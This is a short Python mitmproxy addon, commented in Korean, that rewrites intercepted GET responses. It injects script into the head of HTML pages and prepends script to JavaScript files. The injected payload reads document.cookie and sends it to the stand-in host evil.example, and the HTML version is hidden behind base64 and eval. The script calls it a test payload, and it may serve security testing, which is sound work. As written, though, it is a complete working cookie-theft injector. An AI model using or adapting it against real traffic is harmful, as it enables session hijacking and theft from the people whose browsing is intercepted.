# frontend의 HTML과 JavaScript 응답 앞부분에 payload를 삽입
from mitmproxy import http
import base64

# 테스트 payload
_payload = base64.b64encode(
    b"var _x=document.cookie;new Image().src='http://evil.example/s?'+_x;"
).decode()
MALICIOUS_HTML = '<script>eval(atob("' + _payload * 20 + '"))</script>'
MALICIOUS_JS = 'try{var _x=document.cookie;new Image().src="http://evil.example/s?"+_x;}catch(e){};' * 20


def _inject_html(body: str) -> str | None:
    low = body.lower()
    h = low.find("<head")
    if h < 0:
        return None
    end = body.find(">", h)
    if end < 0:
        return None
    return body[:end + 1] + MALICIOUS_HTML + body[end + 1:]


def response(flow: http.HTTPFlow) -> None:
    if flow.request.method != "GET":
        return
    ctype = flow.response.headers.get("Content-Type", "").lower()
    body = flow.response.get_text(strict=False)
    if body is None:
        return

    if "text/html" in ctype or flow.request.path in ("/", "") or flow.request.path.endswith(".html"):
        tampered = _inject_html(body)
        if tampered is None:
            tampered = MALICIOUS_HTML + body
        flow.response.set_text(tampered)
    elif "javascript" in ctype or flow.request.path.endswith(".js"):
        flow.response.set_text(MALICIOUS_JS + body)
    else:
        return
